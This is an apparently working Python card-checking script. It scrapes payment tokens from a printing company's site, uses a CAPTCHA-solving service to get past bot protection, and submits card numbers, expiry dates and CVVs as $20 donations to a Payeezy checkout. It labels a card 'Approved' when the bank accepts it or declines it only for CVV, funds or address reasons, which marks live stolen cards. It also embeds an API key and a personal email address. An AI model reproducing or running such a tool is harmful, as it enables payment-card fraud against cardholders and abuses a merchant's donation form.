import httpx
import capsolver
import asyncio

CAPSOLVER_KEY = "CAP-6A109327964DEB86309B9891B1BF0590"
SITE_KEY = "6LfBt9wmAAAAAFlQ5-gfCfZNq4OfsDjgam-BI73y"

class CaptchaSolver:
    @staticmethod
    async def solve_v2(sitekey: str, url: str) -> str:
        try:
            capsolver.api_key = CAPSOLVER_KEY
            loop = asyncio.get_event_loop()
            solution = await loop.run_in_executor(
                None,
                lambda: capsolver.solve({
                    "type": "ReCaptchaV2TaskProxyLess", 
                    "websiteURL": url,
                    "websiteKey": sitekey,
                })
            )
            return solution.get("gRecaptchaResponse", "")
        except Exception as e:
            print(f"Error solving captcha: {e}")
            return ""

async def payeezy(cc, mes, ano, cvv):
    async with httpx.AsyncClient() as client:
        try:
            response = await client.get('http://funeralprogramprinting.com/')
            xlogin = response.text.split('name="x_login" value="')[1].split('"')[0]
            xsecuence = response.text.split('name="x_fp_sequence" value="')[1].split('"')[0]
            xhash = response.text.split('name="x_fp_hash" value="')[1].split('"')[0]

            # Resolver CAPTCHA
            captcha_response = await CaptchaSolver.solve_v2(SITE_KEY, 'https://checkout.globalgatewaye4.firstdata.com')
            if not captcha_response:
                return "Captcha solving failed", "", "", "Declined ❌"

            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'http://funeralprogramprinting.com',
            }

            json_data = {
                'cc_expiry': f"{mes}{ano[2:]}",
                'cardholder_name': 'JOSE LP',
                'cc_number': cc,
                'customerEmail': 'cceres679@gmail.com',
                'paymentType': 'payNowDonateNow',
                'zip': '90025',
                'transaction_type': '00',
                'xlogin': xlogin,
                'hashKey': xhash,
                'amount': '20',
                'recaptchaToken': captcha_response,
                'address': {
                    'zip': '90025',
                },
                'cvd_presence_indicator': '0',
            }

            req3 = await client.post(
                'https://checkout.globalgatewaye4.firstdata.com/payeezyhcoapp/transaction/v1',
                headers=headers,
                json=json_data,
            )

            msg = (await req3.aread()).decode('utf-8')

            # Manejo de las respuestas del API
            try:
                exact_message = msg.split('"exact_message":"')[1].split('"')[0]
            except IndexError:
                exact_message = "No disponible"

            try:
                bank_message = msg.split('"bank_message":"')[1].split('"')[0]
            except IndexError:
                bank_message = "No disponible"

            try:
                avs = msg.split('"avs":"')[1].split('"')[0]
            except IndexError:
                avs = "No disponible"

            # Evaluar el estado de la respuesta
            if "Approved" in bank_message:
                status = "Approved ✅"
            elif "CVV2/VAK Failure" in bank_message:
                status = "Approved ✅"
            elif "Insufficient Funds" in bank_message:
                status = "Approved ✅"
            elif "Address not Verified" in msg:
                status = "Approved "
            else:
                status = "Declined ❌"

            return exact_message, avs, bank_message, status
        except Exception as e:
            return f"Error during processing: {e}", "", "", "Declined ❌"
